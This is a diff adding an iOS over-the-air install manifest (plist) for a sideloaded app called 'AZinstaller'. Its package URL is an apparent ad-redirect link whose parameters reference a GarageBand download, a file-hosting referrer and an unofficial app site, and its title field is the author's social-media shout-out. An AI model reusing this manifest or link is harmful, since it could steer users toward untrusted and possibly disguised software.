@@ -1,0 +1,65 @@
+
+
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<!-- array of downloads. -->
+	<key>items</key>
+	<array>
+		<dict>
+			<!-- an array of assets to download -->
+				<key>assets</key>
+				<array>
+					<dict>
+						<!-- required. the asset kind. -->
+						<key>kind</key>
+						<string>software-package</string>
+						<key>url</key>
+						<string>https://hecrowcati.info/?tid=771512&red=1&cs=VUdNNFNkcnUMMGwiegQxbHMsBGNl&abt=0&v=1.34.5.0&sm=16&k=download%201131%20mobile%20garage%20band%20apple%20v4880%20phone5s%20univ%20os110%20user%20hidden&sts=0&prn=0&emb=0&u=e90cba86c35d554c09ae121a01f60be1&fs=1&ref=https%3A%2F%2Fdailyuploads.net%2F17c9i3gkn8dz&osr=www.iphonecake.com&jst=0&enr=0&lcua=mozilla%2F5.0%20(iphone%3B%20cpu%20iphone%20os%2012_0_1%20like%20mac%20os%20x)%20applewebkit%2F605.1.15%20(khtml%2C%20like%20gecko)%20version%2F12.0%20mobile%2F15e148%20safari%2F604.1&tzd=3&uloc=ar&if=0&_wpm4=1551712065810</string>
+					</dict>
+					<dict>
+						<key>kind</key>
+						<string>display-image</string>
+						<key>needs-shine</key>
+						<true/>
+						<key>url</key>
+						<string>https://e.top4top.net/p_974e8d8m1.png</string>
+					</dict>
+					<dict>
+						<key>kind</key>
+						<string>full-size-image</string>
+						<key>needs-shine</key>
+						<true/>
+						<key>url</key>
+						<string>https://e.top4top.net/p_974e8d8m1.png</string>
+					</dict>
+				</array>
+				<key>metadata</key>
+			<dict>
+				<key>bundle-identifier</key>
+				<string>me.975q8.AZinstaller</string>
+				<key>bundle-version</key>
+				<string>5.4</string>
+				<key>kind</key>
+				<string>software</string>
+				<key>title</key>
+				<string>
+
+install Application 
+
+You used MY Toles #itsFywre
+twitter   : @its_Fywre
+snapchat  : @its_fywre
+instagram : @its_fywre
+
+itsFywre
+
+
+				</string>
+			</dict>
+		</dict>
+	</array>
+</dict>
+</plist>
+
+ 
